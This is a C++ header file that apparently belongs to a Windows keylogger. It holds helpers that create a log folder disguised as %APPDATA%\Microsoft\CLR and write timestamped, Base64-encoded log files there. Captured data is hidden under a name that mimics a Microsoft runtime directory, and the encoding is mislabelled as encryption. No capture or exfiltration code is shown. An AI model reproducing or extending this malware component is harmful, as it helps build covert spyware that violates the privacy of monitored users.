#ifndef IO_H_INCLUDED
#define IO_H_INCLUDED

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "./../headers/Helper.h"
#include "./../headers/Base64.h"

namespace IO
{
    // Gets the target directory directory of current user
    std::string GetOurPath(const bool append_seperator = false)
    {
        // Gets the "APPDATA" directory of the current user
        std::string appdata_dir(getenv("APPDATA"));
        std::string full = appdata_dir + "\\Microsoft\\CLR";
        return full + (append_seperator ? "\\" : "");
    }

    // Makes a directory if it does not already exist
    bool MkOneDir(std::string path)
    {
        return (bool)CreateDirectory(path.c_str(), NULL) ||
                GetLastError() == ERROR_ALREADY_EXISTS;
    }

    /* Checks any leading directory that may not exists
     * Ex) C:\User\Username\Folder
     * If the folder "Username" does not exist, then the path
     * for MkOneDr is incorrect
     * This function serves to check for these errors */
     bool MkDir(std::string path)
     {
         // Reads the path char by char
         for(char &c : path)
         {
            if(c == '\\')   // If we encounter "\"; the beginning of another folder
            {
                c = '\0';   // Set the path to stop there
                if(!MkOneDir(path)) // Check if this path is not valid, if true, return false
                    return false;
                c = '\\';   // Set char back to '\' to continue checking rest of path
            }
         }

        return true;    // The entire path is correct
     }

     template <class T>

     // Writes to the log file that we create
     std::string WriteLog(const T &t)
     {
         std::string path = GetOurPath(true);
         Helper::DateTime dt;
         std::string name = dt.GetDateTimeString("_") + ".log"; // Name the log file with date and time


         try    // Attempt to write to log file
         {
             std::ofstream file(path + name);      // Create the log file in the path
             if(!file)                             // If file does not exist, return nothing
                return "";
             std::ostringstream s;
             s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;  // Appending to the string stream
             std::string data = Base64::EncryptB64(s.str());        // Encrypt the string stream
             file << data;                         // Write the strings into the log file
             if(!file)
                return "";
             file.close();

             return name;
         }
         catch(...)     // If writing to log file fails, return nothing
         {
             return "";
         }
     }
}

#endif // IO_H_INCLUDED
